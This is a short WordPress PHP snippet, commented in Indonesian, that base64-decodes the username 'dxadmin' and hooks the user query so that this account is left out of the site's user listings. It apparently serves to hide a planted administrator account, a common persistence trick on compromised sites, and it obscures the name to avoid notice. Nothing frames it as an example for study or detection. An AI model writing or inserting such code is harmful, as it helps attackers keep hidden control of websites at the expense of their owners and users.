<?php

$u = base64_decode('ZHhhZG1pbg=='); // decode jadi "dxadmin"

add_filter('pre_user_query', function($user_search) use ($u) {
    global $wpdb;
    $user_search->query_where .= " AND {$wpdb->users}.user_login != '".$u."'";
});

